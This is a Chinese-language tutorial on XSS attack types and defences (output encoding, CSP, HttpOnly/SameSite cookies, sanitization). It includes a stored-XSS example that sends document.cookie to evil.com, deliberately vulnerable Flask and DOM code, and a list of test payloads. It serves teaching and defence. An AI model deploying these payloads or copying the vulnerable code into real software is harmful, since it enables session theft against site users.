# XSS 跨站腳本攻擊

## XSS 原理

XSS（Cross-Site Scripting）允許攻擊者在受害者的瀏覽器中執行惡意腳本。當應用程式未經處理就輸出使用者輸入時，就可能遭受 XSS 攻擊。

## XSS 類型

### 儲存型 XSS

攻擊者將惡意腳本儲存到伺服器，之後所有訪問該頁面的使用者都會執行腳本。

```html
<!-- 攻擊者發布的文章包含惡意腳本 -->
<script>
  document.location='https://evil.com/steal?cookie='+document.cookie
</script>
```

### 反射型 XSS

惡意腳本透過 URL 參數傳入，伺服器未處理就包含在回應中。

```python
# Flask 不安全的範例
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f'<h1>Search results for: {query}</h1>'
# 如果 ?q=<script>alert(1)</script>，腳本就會執行
```

### DOM 型 XSS

腳本在客戶端執行，讀取並執行不安全的 URL 片段。

```javascript
// 不安全的 JavaScript
var pos = document.URL.indexOf("item=") + 5;
document.write(document.URL.substring(pos, document.URL.length));
```

## 輸出編碼

防止 XSS 的核心原則是「永遠不要相信使用者輸入，永遠在輸出時編碼」。

### HTML 上下文

```python
import html

# Python Jinja2 模板（預設會自動轉義）
{{ user_input }}

# 手動轉義
from markupsafe import escape
safe_output = escape(user_input)
```

### JavaScript 上下文

```python
import json

# 在 JavaScript 中插入資料時
script = f'<script>var data = {json.dumps(user_input)};</script>'
# 注意：json.dumps 會處理字串中的特殊字元
```

### URL 上下文

```python
from urllib.parse import quote

# 對 URL 參數值進行編碼
encoded = quote(user_input)
url = f'https://example.com/search?q={encoded}'
```

## 內容安全政策（CSP）

CSP 是一個 HTTP header，告訴瀏覽器哪些資源可以執行：

```nginx
# 只允許同源的指令碼
add_header Content-Security-Policy "default-src 'self';" always;

# 允許特定 CDN
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com;" always;
```

### 常用 CSP 指令

```
default-src: 預設來源
script-src: JavaScript 來源
style-src: CSS 來源
img-src: 圖片來源
connect-src: AJAX, WebSocket 來源
frame-src: iframe 來源
```

## HTTPOnly Cookie

防止 JavaScript 讀取敏感的 Cookie：

```python
# Flask 設定
from flask import make_response
resp = make_response(render_template('page.html'))
resp.set_cookie('session', session_id, httponly=True, secure=True, samesite='Lax')
```

`httponly=True` 防止 JavaScript 讀取 Cookie，但仍允許正常的請求傳送。

## SameSite Cookie

進一步防止 CSRF 攻擊：

```python
# Lax：正常請求會發送 Cookie，但從外部站點過來的請求不會
resp.set_cookie('session', session_id, samesite='Lax')

# Strict：完全不會從第三方網站發送
resp.set_cookie('session', session_id, samesite='Strict')
```

## 測試 XSS 漏洞

```bash
# 使用 OWASP ZAP
zap-cli quick-scan http://example.com

# 手動測試常見的 XSS payload
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
'"><script>alert(1)</script>
```

## 輸入驗證作為額外防護

```python
import re

def sanitize_html(html_content):
    # 移除所有 HTML 標籤（如果不需要 HTML）
    return re.sub(r'<[^>]+>', '', html_content)

def allow_safe_html(html_content):
    # 使用 bleach 庫的白名單清理
    import bleach
    return bleach.clean(html_content, tags=['p', 'br', 'b', 'i', 'em'], attributes={}, strip=True)
```

## 參考資源

- https://www.google.com/search?q=XSS+跨站腳本+攻擊+防護+輸出編碼+CSP+2016
- https://www.google.com/search?q=儲存型+反射型+DOM型+XSS+差異+原理+範例
- https://www.google.com/search?q=Content+Security+Policy+CSP+設定+XSS+防護+nginx+Apache